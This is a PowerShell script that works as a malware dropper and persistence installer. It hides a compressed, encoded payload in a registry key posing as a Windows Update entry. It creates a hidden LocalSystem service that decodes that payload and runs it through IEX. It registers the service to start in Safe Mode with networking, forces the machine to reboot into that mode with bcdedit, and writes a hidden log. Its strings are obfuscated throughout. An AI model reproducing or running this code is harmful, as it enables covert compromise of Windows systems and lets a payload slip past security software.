[CmdletBinding()]param([Switch]$Confirm)
if(!$Confirm){Exit 1}
if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)){Exit 1}
$b='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'
$c=[string]::Join('\',('SOFTWARE','Microsoft','Windows','CurrentVersion'));$r="HKLM:\$c\Uninstall\WindowsUpdate";
if(!(Test-Path $r)){New-Item -Path $r -Force|Out-Null};
Set-ItemProperty -Path $r -Name ([char[]](73,110,115,116,97,108,108,68,97,116,101)-join'') -Value $b -Type 'String' -ErrorAction 0;
$lf = "C:\ProgramData\ksi.log";
$d = Get-Date -Format "yyyy-MM-dd HH:mm:ss";
"[$d] [INJECT] DEPLOY" | Out-File -FilePath $lf -Append -Encoding utf8;
(Get-Item $lf).Attributes = 'Hidden, System';

$sCmd = 'powershell.exe -WindowStyle Hidden -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "$P=(Get-ItemProperty ''HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsUpdate'').InstallDate;$M=[IO.MemoryStream]::new([Convert]::FromBase64String($P));$D=[IO.Compression.DeflateStream]::new($M,[IO.Compression.CompressionMode]0);$S=[IO.StreamReader]::new($D);IEX $S.ReadToEnd()"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($sCmd)
$eCmd = [Convert]::ToBase64String($bytes)
$exe = [char[]](112,111,119,101,114,115,104,101,108,108,46,101,120,101) -join '';
$ImagePath = "$exe -e $eCmd"

$ks = [char[]](107,115,83,118,99) -join '';
$svcPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ks";
if(!(Test-Path $svcPath)){New-Item -Path $svcPath -Force | Out-Null};
Set-ItemProperty -Path $svcPath -Name "ImagePath" -Value $ImagePath -Type ExpandString -ErrorAction Stop;
Set-ItemProperty -Path $svcPath -Name "Type" -Value 16 -Type DWord -ErrorAction Stop;
Set-ItemProperty -Path $svcPath -Name "Start" -Value 2 -Type DWord -ErrorAction Stop;
Set-ItemProperty -Path $svcPath -Name "ErrorControl" -Value 1 -Type DWord -ErrorAction Stop;
Set-ItemProperty -Path $svcPath -Name "ObjectName" -Value "LocalSystem" -Type String -ErrorAction Stop;

$safeBootPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\$ks";
if(!(Test-Path $safeBootPath)){New-Item -Path $safeBootPath -Force | Out-Null};
Set-ItemProperty -Path $safeBootPath -Name "(default)" -Value "Service" -Type String -ErrorAction Stop;

"HKLM:\$c\Policies\Explorer","HKCU:\$c\Policies\Explorer"|ForEach-Object{if(Test-Path $_){Remove-ItemProperty -Path $_ -Name "DisableRunOnce" -ErrorAction 0;Remove-ItemProperty -Path $_ -Name "DisableLocalMachineRunOnce" -ErrorAction 0}};
Remove-ItemProperty -Path "HKLM:\$c\RunOnce" -Name '*x' -ErrorAction 0;
$cur = [char[]](123,99,117,114,114,101,110,116,125) -join '';
$sfb = [char[]](115,97,102,101,98,111,111,116) -join '';
$net = [char[]](110,101,116,119,111,114,107) -join '';
& bcdedit.exe /set $cur $sfb $net | Out-Null;
if($LASTEXITCODE){ Exit 1; };
"[$d] [INJECT] BCK_OK" | Out-File -FilePath $lf -Append -Encoding utf8;
Restart-Computer -Force;
